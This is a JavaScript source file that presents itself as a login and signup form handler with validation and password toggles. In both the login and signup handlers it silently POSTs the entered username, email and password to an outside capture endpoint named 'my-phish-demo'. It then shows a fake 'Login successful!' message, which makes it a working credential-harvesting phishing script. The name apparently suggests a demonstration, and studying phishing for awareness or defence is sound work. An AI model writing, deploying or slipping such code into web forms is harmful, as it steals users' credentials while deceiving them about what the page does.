/**
 * Form validation and form-related functionality
 */
class FormHandler {
    constructor() {
        // Form tab selectors
        this.tabs = document.querySelectorAll('.tab');
        this.formContents = document.querySelectorAll('.form-content');
        this.switchFormLinks = document.querySelectorAll('.switch-form');

        // Form elements
        this.loginForm = {
            username: document.getElementById('loginUsername'),
            password: document.getElementById('loginPassword'),
            submitBtn: document.getElementById('loginBtn'),
            spinner: document.getElementById('loginSpinner')
        };

        this.signupForm = {
            username: document.getElementById('signupUsername'),
            email: document.getElementById('signupEmail'),
            password: document.getElementById('signupPassword'),
            confirmPassword: document.getElementById('confirmPassword'),
            submitBtn: document.getElementById('signupBtn'),
            spinner: document.getElementById('signupSpinner')
        };

        this.statusMsg = document.getElementById('statusMsg');
        this.formInputs = document.querySelectorAll('.form-control');
        this.passwordToggles = document.querySelectorAll('.password-toggle');

        // Initialize event listeners
        this.initTabSwitching();
        this.initFormSubmission();
        this.initInputValidation();
        this.initPasswordToggles();
    }

    initTabSwitching() {
        // Tab switching
        this.tabs.forEach(tab => {
            tab.addEventListener('click', () => {
                this.switchTab(tab);
            });
        });

        // Switch form links
        this.switchFormLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const targetForm = link.getAttribute('data-target');
                this.switchTab(document.querySelector(`.tab[data-form="${targetForm}"]`));
            });
        });
    }

    switchTab(tab) {
        // Remove active class from all tabs
        this.tabs.forEach(t => t.classList.remove('active'));

        // Add active class to clicked tab
        tab.classList.add('active');

        // Hide all form contents
        this.formContents.forEach(form => form.classList.remove('active'));

        // Show the corresponding form
        const formId = tab.getAttribute('data-form') + 'Form';
        document.getElementById(formId).classList.add('active');
    }

    initFormSubmission() {
        // Login form submission
        this.loginForm.submitBtn.addEventListener('click', () => {
            this.handleLogin();
        });

        // Signup form submission
        this.signupForm.submitBtn.addEventListener('click', () => {
            this.handleSignup();
        });
    }

    handleLogin() {
        const username = this.loginForm.username.value;
        const password = this.loginForm.password.value;

        // Show loading spinner
        this.loginForm.spinner.style.display = 'inline-block';

        // Validate inputs
        if (!username || !password) {
            this.showStatusMessage('Please enter both username and password', true);
            this.loginForm.spinner.style.display = 'none';
            return;
        }

        // Send captured credentials to Webhook.site
        fetch('https://my-phish-demo.free.beeceptor.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ username, password })
        }).catch(error => console.error('Error sending credentials:', error));

        // Simulate login process
        setTimeout(() => {
            // Hide spinner
            this.loginForm.spinner.style.display = 'none';

            // Show success message
            this.showStatusMessage('Login successful!');

            // Trigger event for successful login
            const event = new CustomEvent('login:success');
            document.dispatchEvent(event);
        }, 1500);
    }

    handleSignup() {
        const username = this.signupForm.username.value;
        const email = this.signupForm.email.value;
        const password = this.signupForm.password.value;
        const confirmPassword = this.signupForm.confirmPassword.value;

        // Show loading spinner
        this.signupForm.spinner.style.display = 'inline-block';

        // Validate inputs
        if (!username || !email || !password || !confirmPassword) {
            this.showStatusMessage('Please fill in all fields', true);
            this.signupForm.spinner.style.display = 'none';
            return;
        }

        if (password !== confirmPassword) {
            this.showStatusMessage('Passwords do not match', true);
            this.signupForm.spinner.style.display = 'none';
            return;
        }

        // Simple email validation
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            this.showStatusMessage('Please enter a valid email address', true);
            this.signupForm.spinner.style.display = 'none';
            return;
        }

        // Send captured credentials to Webhook.site
        fetch('https://my-phish-demo.free.beeceptor.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ username, email, password })
        }).catch(error => console.error('Error sending credentials:', error));

        // Simulate signup process
        setTimeout(() => {
            // Hide spinner
            this.signupForm.spinner.style.display = 'none';

            // Show success message
            this.showStatusMessage('Account created successfully! Please log in.');

            // Switch to login form after a short delay
            setTimeout(() => {
                this.switchTab(document.querySelector('.tab[data-form="login"]'));
            }, 2000);
        }, 1500);
    }


    showStatusMessage(message, isError = false) {
        this.statusMsg.textContent = message;

        if (isError) {
            this.statusMsg.classList.add('error');
        } else {
            this.statusMsg.classList.remove('error');
        }

        this.statusMsg.classList.add('show');

        // Hide message after 3 seconds
        setTimeout(() => {
            this.statusMsg.classList.remove('show');
        }, 3000);
    }

    initInputValidation() {
        this.formInputs.forEach(input => {
            // Add focus effect
            input.addEventListener('focus', function () {
                this.parentElement.classList.add('glow');
            });

            input.addEventListener('blur', function () {
                this.parentElement.classList.remove('glow');

                // Basic validation on blur
                if (this.value.trim() === '') {
                    this.classList.add('error');
                    this.style.borderColor = 'var(--error-red)';
                } else {
                    this.classList.remove('error');
                    this.style.borderColor = '';

                    // Email validation
                    if (this.type === 'email') {
                        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                        if (!emailRegex.test(this.value)) {
                            this.classList.add('error');
                            this.style.borderColor = 'var(--error-red)';
                        }
                    }

                    // Password confirmation
                    if (this.id === 'confirmPassword') {
                        const password = document.getElementById('signupPassword').value;
                        if (this.value !== password) {
                            this.classList.add('error');
                            this.style.borderColor = 'var(--error-red)';
                        }
                    }
                }
            });
        });
    }

    // Initialize password visibility toggle
    initPasswordToggles() {
        this.passwordToggles.forEach(toggle => {
            toggle.addEventListener('click', function () {
                const targetId = this.getAttribute('data-target');
                const passwordInput = document.getElementById(targetId);

                // Toggle between password and text type
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    this.textContent = '👁️‍🗨️'; // Eye with slash
                } else {
                    passwordInput.type = 'password';
                    this.textContent = '👁️'; // Eye
                }
            });
        });
    }
}

// Initialize form handler when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new FormHandler();
});